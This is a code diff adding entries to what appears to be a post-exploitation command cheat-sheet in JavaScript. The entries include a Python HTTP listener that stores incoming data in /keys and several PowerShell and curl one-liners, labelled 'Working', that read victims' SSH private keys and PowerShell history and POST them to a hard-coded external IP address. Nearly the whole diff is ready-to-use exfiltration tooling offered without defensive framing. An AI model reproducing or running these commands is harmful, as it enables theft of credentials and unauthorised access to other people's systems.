@@ -2039,6 +2039,54 @@ const COMMANDS = [
     tags: ["cmd", "postexploit", "c2"],
     accent: "#ff6b35"
   },
+  {
+    title: "Simple HTTP Receiver (VPS)",
+    code: "cat > /opt/catch_all.py << 'EOF'\\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\\nfrom datetime import datetime\\nimport os\\n\\nclass Handler(BaseHTTPRequestHandler):\\n    def do_POST(self):\\n        length = int(self.headers.get('Content-Length', 0))\\n        body = self.rfile.read(length)\\n        ts = datetime.now().strftime('%Y%m%d_%H%M%S')\\n        path = self.path.replace('/', '_')\\n        filename = f'/keys/{ts}{path}.txt'\\n        with open(filename, 'wb') as f:\\n            f.write(body)\\n        print(f'[+] Saved {len(body)} bytes to {filename}')\\n        self.send_response(200)\\n        self.end_headers()\\n        self.wfile.write(b'OK')\\n\\nos.makedirs('/keys', exist_ok=True)\\nprint('[*] Listening on 0.0.0.0:8083')\\nHTTPServer(('0.0.0.0', 8083), Handler).serve_forever()\\nEOF\\npython3 /opt/catch_all.py",
+    tags: ["linux", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Exfil SSH Key (Working)",
+    code: "Invoke-RestMethod -Uri 'http://168.144.166.97:8083/key' -Method POST -Body (Get-Content C:\\\\Users\\\\victim\\\\.ssh\\\\id_ed25519 -Raw)",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil All SSH Keys (Working)",
+    code: "(Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -EA SilentlyContinue | ForEach-Object { \"=== $_ ===`n\" + (Get-Content $_ -Raw) }) -join \"`n\" | % { Invoke-RestMethod -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $_ }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil via Curl (Alt)",
+    code: "type C:\\\\Users\\\\victim\\\\.ssh\\\\id_ed25519 | curl.exe -X POST -d @- http://168.144.166.97:8083/key",
+    tags: ["cmd", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil PS History",
+    code: "Invoke-RestMethod -Uri 'http://168.144.166.97:8083/history' -Method POST -Body (Get-Content $env:APPDATA\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -Raw)",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil with UseBasicParsing",
+    code: "IWR -Uri 'http://168.144.166.97:8083/data' -Method POST -Body $data -UseBasicParsing",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Kill Old Receiver",
+    code: "pkill -f simple_receiver; pkill -f catch_all",
+    tags: ["linux", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Watch Incoming Files",
+    code: "watch -n 1 'ls -la /keys/'",
+    tags: ["linux", "c2"],
+    accent: "#00ff41"
+  },
 ];
 
 const list = document.getElementById('cmdList');
